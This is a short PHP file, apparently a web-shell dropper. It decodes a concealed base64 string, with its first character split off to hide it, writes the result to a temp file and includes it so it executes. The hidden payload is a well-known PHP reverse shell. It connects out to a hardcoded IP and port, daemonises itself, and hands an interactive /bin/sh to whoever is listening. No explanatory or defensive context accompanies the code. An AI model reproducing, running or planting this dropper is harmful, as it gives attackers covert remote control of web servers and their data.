<?php
$tmp=tempnam('/tmp','FOO');
$c=base64_decode('P'.'z48P3BocAovLyBwaHAtcmV2ZXJzZS1zaGVsbCAtIEEgUmV2ZXJzZSBTaGVsbCBpbXBsZW1lbnRhdGlvbiBpbiBQSFAKLy8gQ29weXJpZ2h0IChDKSAyMDA3IHBlbnRlc3Rtb25rZXlAcGVudGVzdG1vbmtleS5uZXQKLy8KLy8gVGhpcyB0b29sIG1heSBiZSB1c2VkIGZvciBsZWdhbCBwdXJwb3NlcyBvbmx5LiAgVXNlcnMgdGFrZSBmdWxsIHJlc3BvbnNpYmlsaXR5Ci8vIGZvciBhbnkgYWN0aW9ucyBwZXJmb3JtZWQgdXNpbmcgdGhpcyB0b29sLiAgVGhlIGF1dGhvciBhY2NlcHRzIG5vIGxpYWJpbGl0eQovLyBmb3IgZGFtYWdlIGNhdXNlZCBieSB0aGlzIHRvb2wuICBJZiB0aGVzZSB0ZXJtcyBhcmUgbm90IGFjY2VwdGFibGUgdG8geW91LCB0aGVuCi8vIGRvIG5vdCB1c2UgdGhpcyB0b29sLgovLwovLyBJbiBhbGwgb3RoZXIgcmVzcGVjdHMgdGhlIEdQTCB2ZXJzaW9uIDIgYXBwbGllczoKLy8KLy8gVGhpcyBwcm9ncmFtIGlzIGZyZWUgc29mdHdhcmU7IHlvdSBjYW4gcmVkaXN0cmlidXRlIGl0IGFuZC9vciBtb2RpZnkKLy8gaXQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSB2ZXJzaW9uIDIgYXMKLy8gcHVibGlzaGVkIGJ5IHRoZSBGcmVlIFNvZnR3YXJlIEZvdW5kYXRpb24uCi8vCi8vIFRoaXMgcHJvZ3JhbSBpcyBkaXN0cmlidXRlZCBpbiB0aGUgaG9wZSB0aGF0IGl0IHdpbGwgYmUgdXNlZnVsLAovLyBidXQgV0lUSE9VVCBBTlkgV0FSUkFOVFk7IHdpdGhvdXQgZXZlbiB0aGUgaW1wbGllZCB3YXJyYW50eSBvZgovLyBNRVJDSEFOVEFCSUxJVFkgb3IgRklUTkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UuICBTZWUgdGhlCi8vIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGZvciBtb3JlIGRldGFpbHMuCi8vCi8vIFlvdSBzaG91bGQgaGF2ZSByZWNlaXZlZCBhIGNvcHkgb2YgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGFsb25nCi8vIHdpdGggdGhpcyBwcm9ncmFtOyBpZiBub3QsIHdyaXRlIHRvIHRoZSBGcmVlIFNvZnR3YXJlIEZvdW5kYXRpb24sIEluYy4sCi8vIDUxIEZyYW5rbGluIFN0cmVldCwgRmlmdGggRmxvb3IsIEJvc3RvbiwgTUEgMDIxMTAtMTMwMSBVU0EuCi8vCi8vIFRoaXMgdG9vbCBtYXkgYmUgdXNlZCBmb3IgbGVnYWwgcHVycG9zZXMgb25seS4gIFVzZXJzIHRha2UgZnVsbCByZXNwb25zaWJpbGl0eQovLyBmb3IgYW55IGFjdGlvbnMgcGVyZm9ybWVkIHVzaW5nIHRoaXMgdG9vbC4gIElmIHRoZXNlIHRlcm1zIGFyZSBub3QgYWNjZXB0YWJsZSB0bwovLyB5b3UsIHRoZW4gZG8gbm90IHVzZSB0aGlzIHRvb2wuCi8vCi8vIFlvdSBhcmUgZW5jb3VyYWdlZCB0byBzZW5kIGNvbW1lbnRzLCBpbXByb3ZlbWVudHMgb3Igc3VnZ2VzdGlvbnMgdG8KLy8gbWUgYXQgcGVudGVzdG1vbmtleUBwZW50ZXN0bW9ua2V5Lm5ldAovLwovLyBEZXNjcmlwdGlvbgovLyAtLS0tLS0tLS0tLQovLyBUaGlzIHNjcmlwdCB3aWxsIG1ha2UgYW4gb3V0Ym91bmQgVENQIGNvbm5lY3Rpb24gdG8gYSBoYXJkY29kZWQgSVAgYW5kIHBvcnQuCi8vIFRoZSByZWNpcGllbnQgd2lsbCBiZSBnaXZlbiBhIHNoZWxsIHJ1bm5pbmcgYXMgdGhlIGN1cnJlbnQgdXNlciAoYXBhY2hlIG5vcm1hbGx5KS4KLy8KLy8gTGltaXRhdGlvbnMKLy8gLS0tLS0tLS0tLS0KLy8gcHJvY19vcGVuIGFuZCBzdHJlYW1fc2V0X2Jsb2NraW5nIHJlcXVpcmUgUEhQIHZlcnNpb24gNC4zKywgb3IgNSsKLy8gVXNlIG9mIHN0cmVhbV9zZWxlY3QoKSBvbiBmaWxlIGRlc2NyaXB0b3JzIHJldHVybmVkIGJ5IHByb2Nfb3BlbigpIHdpbGwgZmFpbCBhbmQgcmV0dXJuIEZBTFNFIHVuZGVyIFdpbmRvd3MuCi8vIFNvbWUgY29tcGlsZS10aW1lIG9wdGlvbnMgYXJlIG5lZWRlZCBmb3IgZGFlbW9uaXNhdGlvbiAobGlrZSBwY250bCwgcG9zaXgpLiAgVGhlc2UgYXJlIHJhcmVseSBhdmFpbGFibGUuCi8vCi8vIFVzYWdlCi8vIC0tLS0tCi8vIFNlZSBodHRwOi8vcGVudGVzdG1vbmtleS5uZXQvdG9vbHMvcGhwLXJldmVyc2Utc2hlbGwgaWYgeW91IGdldCBzdHVjay4KCnNldF90aW1lX2xpbWl0ICgwKTsKJFZFUlNJT04gPSAiMS4wIjsKJGlwID0gJzEyNy4wLjAuMSc7ICAvLyBDSEFOR0UgVEhJUwokcG9ydCA9IDEyMzQ7ICAgICAgIC8vIENIQU5HRSBUSElTCiRjaHVua19zaXplID0gMTQwMDsKJHdyaXRlX2EgPSBudWxsOwokZXJyb3JfYSA9IG51bGw7CiRzaGVsbCA9ICd1bmFtZSAtYTsgdzsgaWQ7IC9iaW4vc2ggLWknOwokZGFlbW9uID0gMDsKJGRlYnVnID0gMDsKCi8vCi8vIERhZW1vbmlzZSBvdXJzZWxmIGlmIHBvc3NpYmxlIHRvIGF2b2lkIHpvbWJpZXMgbGF0ZXIKLy8KCi8vIHBjbnRsX2ZvcmsgaXMgaGFyZGx5IGV2ZXIgYXZhaWxhYmxlLCBidXQgd2lsbCBhbGxvdyB1cyB0byBkYWVtb25pc2UKLy8gb3VyIHBocCBwcm9jZXNzIGFuZCBhdm9pZCB6b21iaWVzLiAgV29ydGggYSB0cnkuLi4KaWYgKGZ1bmN0aW9uX2V4aXN0cygncGNudGxfZm9yaycpKSB7CgkvLyBGb3JrIGFuZCBoYXZlIHRoZSBwYXJlbnQgcHJvY2VzcyBleGl0CgkkcGlkID0gcGNudGxfZm9yaygpOwoJCglpZiAoJHBpZCA9PSAtMSkgewoJCXByaW50aXQoIkVSUk9SOiBDYW4ndCBmb3JrIik7CgkJZXhpdCgxKTsKCX0KCQoJaWYgKCRwaWQpIHsKCQlleGl0KDApOyAgLy8gUGFyZW50IGV4aXRzCgl9CgoJLy8gTWFrZSB0aGUgY3VycmVudCBwcm9jZXNzIGEgc2Vzc2lvbiBsZWFkZXIKCS8vIFdpbGwgb25seSBzdWNjZWVkIGlmIHdlIGZvcmtlZAoJaWYgKHBvc2l4X3NldHNpZCgpID09IC0xKSB7CgkJcHJpbnRpdCgiRXJyb3I6IENhbid0IHNldHNpZCgpIik7CgkJZXhpdCgxKTsKCX0KCgkkZGFlbW9uID0gMTsKfSBlbHNlIHsKCXByaW50aXQoIldBUk5JTkc6IEZhaWxlZCB0byBkYWVtb25pc2UuICBUaGlzIGlzIHF1aXRlIGNvbW1vbiBhbmQgbm90IGZhdGFsLiIpOwp9CgovLyBDaGFuZ2UgdG8gYSBzYWZlIGRpcmVjdG9yeQpjaGRpcigiLyIpOwoKLy8gUmVtb3ZlIGFueSB1bWFzayB3ZSBpbmhlcml0ZWQKdW1hc2soMCk7CgovLwovLyBEbyB0aGUgcmV2ZXJzZSBzaGVsbC4uLgovLwoKLy8gT3BlbiByZXZlcnNlIGNvbm5lY3Rpb24KJHNvY2sgPSBmc29ja29wZW4oJGlwLCAkcG9ydCwgJGVycm5vLCAkZXJyc3RyLCAzMCk7CmlmICghJHNvY2spIHsKCXByaW50aXQoIiRlcnJzdHIgKCRlcnJubykiKTsKCWV4aXQoMSk7Cn0KCi8vIFNwYXduIHNoZWxsIHByb2Nlc3MKJGRlc2NyaXB0b3JzcGVjID0gYXJyYXkoCiAgIDAgPT4gYXJyYXkoInBpcGUiLCAiciIpLCAgLy8gc3RkaW4gaXMgYSBwaXBlIHRoYXQgdGhlIGNoaWxkIHdpbGwgcmVhZCBmcm9tCiAgIDEgPT4gYXJyYXkoInBpcGUiLCAidyIpLCAgLy8gc3Rkb3V0IGlzIGEgcGlwZSB0aGF0IHRoZSBjaGlsZCB3aWxsIHdyaXRlIHRvCiAgIDIgPT4gYXJyYXkoInBpcGUiLCAidyIpICAgLy8gc3RkZXJyIGlzIGEgcGlwZSB0aGF0IHRoZSBjaGlsZCB3aWxsIHdyaXRlIHRvCik7CgokcHJvY2VzcyA9IHByb2Nfb3Blbigkc2hlbGwsICRkZXNjcmlwdG9yc3BlYywgJHBpcGVzKTsKCmlmICghaXNfcmVzb3VyY2UoJHByb2Nlc3MpKSB7CglwcmludGl0KCJFUlJPUjogQ2FuJ3Qgc3Bhd24gc2hlbGwiKTsKCWV4aXQoMSk7Cn0KCi8vIFNldCBldmVyeXRoaW5nIHRvIG5vbi1ibG9ja2luZwovLyBSZWFzb246IE9jY3Npb25hbGx5IHJlYWRzIHdpbGwgYmxvY2ssIGV2ZW4gdGhvdWdoIHN0cmVhbV9zZWxlY3QgdGVsbHMgdXMgdGhleSB3b24ndApzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1swXSwgMCk7CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzFdLCAwKTsKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMl0sIDApOwpzdHJlYW1fc2V0X2Jsb2NraW5nKCRzb2NrLCAwKTsKCnByaW50aXQoIlN1Y2Nlc3NmdWxseSBvcGVuZWQgcmV2ZXJzZSBzaGVsbCB0byAkaXA6JHBvcnQiKTsKCndoaWxlICgxKSB7CgkvLyBDaGVjayBmb3IgZW5kIG9mIFRDUCBjb25uZWN0aW9uCglpZiAoZmVvZigkc29jaykpIHsKCQlwcmludGl0KCJFUlJPUjogU2hlbGwgY29ubmVjdGlvbiB0ZXJtaW5hdGVkIik7CgkJYnJlYWs7Cgl9CgoJLy8gQ2hlY2sgZm9yIGVuZCBvZiBTVERPVVQKCWlmIChmZW9mKCRwaXBlc1sxXSkpIHsKCQlwcmludGl0KCJFUlJPUjogU2hlbGwgcHJvY2VzcyB0ZXJtaW5hdGVkIik7CgkJYnJlYWs7Cgl9CgoJLy8gV2FpdCB1bnRpbCBhIGNvbW1hbmQgaXMgZW5kIGRvd24gJHNvY2ssIG9yIHNvbWUKCS8vIGNvbW1hbmQgb3V0cHV0IGlzIGF2YWlsYWJsZSBvbiBTVERPVVQgb3IgU1RERVJSCgkkcmVhZF9hID0gYXJyYXkoJHNvY2ssICRwaXBlc1sxXSwgJHBpcGVzWzJdKTsKCSRudW1fY2hhbmdlZF9zb2NrZXRzID0gc3RyZWFtX3NlbGVjdCgkcmVhZF9hLCAkd3JpdGVfYSwgJGVycm9yX2EsIG51bGwpOwoKCS8vIElmIHdlIGNhbiByZWFkIGZyb20gdGhlIFRDUCBzb2NrZXQsIHNlbmQKCS8vIGRhdGEgdG8gcHJvY2VzcydzIFNURElOCglpZiAoaW5fYXJyYXkoJHNvY2ssICRyZWFkX2EpKSB7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU09DSyBSRUFEIik7CgkJJGlucHV0ID0gZnJlYWQoJHNvY2ssICRjaHVua19zaXplKTsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTT0NLOiAkaW5wdXQiKTsKCQlmd3JpdGUoJHBpcGVzWzBdLCAkaW5wdXQpOwoJfQoKCS8vIElmIHdlIGNhbiByZWFkIGZyb20gdGhlIHByb2Nlc3MncyBTVERPVVQKCS8vIHNlbmQgZGF0YSBkb3duIHRjcCBjb25uZWN0aW9uCglpZiAoaW5fYXJyYXkoJHBpcGVzWzFdLCAkcmVhZF9hKSkgewoJCWlmICgkZGVidWcpIHByaW50aXQoIlNURE9VVCBSRUFEIik7CgkJJGlucHV0ID0gZnJlYWQoJHBpcGVzWzFdLCAkY2h1bmtfc2l6ZSk7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RET1VUOiAkaW5wdXQiKTsKCQlmd3JpdGUoJHNvY2ssICRpbnB1dCk7Cgl9CgoJLy8gSWYgd2UgY2FuIHJlYWQgZnJvbSB0aGUgcHJvY2VzcydzIFNUREVSUgoJLy8gc2VuZCBkYXRhIGRvd24gdGNwIGNvbm5lY3Rpb24KCWlmIChpbl9hcnJheSgkcGlwZXNbMl0sICRyZWFkX2EpKSB7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RERVJSIFJFQUQiKTsKCQkkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMl0sICRjaHVua19zaXplKTsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERFUlI6ICRpbnB1dCIpOwoJCWZ3cml0ZSgkc29jaywgJGlucHV0KTsKCX0KfQoKZmNsb3NlKCRzb2NrKTsKZmNsb3NlKCRwaXBlc1swXSk7CmZjbG9zZSgkcGlwZXNbMV0pOwpmY2xvc2UoJHBpcGVzWzJdKTsKcHJvY19jbG9zZSgkcHJvY2Vzcyk7CgovLyBMaWtlIHByaW50LCBidXQgZG9lcyBub3RoaW5nIGlmIHdlJ3ZlIGRhZW1vbmlzZWQgb3Vyc2VsZgovLyAoSSBjYW4ndCBmaWd1cmUgb3V0IGhvdyB0byByZWRpcmVjdCBTVERPVVQgbGlrZSBhIHByb3BlciBkYWVtb24pCmZ1bmN0aW9uIHByaW50aXQgKCRzdHJpbmcpIHsKCWlmICghJGRhZW1vbikgewoJCXByaW50ICIkc3RyaW5nXG4iOwoJfQp9Cgo/PiAKCgoK');
file_put_contents($tmp, $c);
include $tmp;
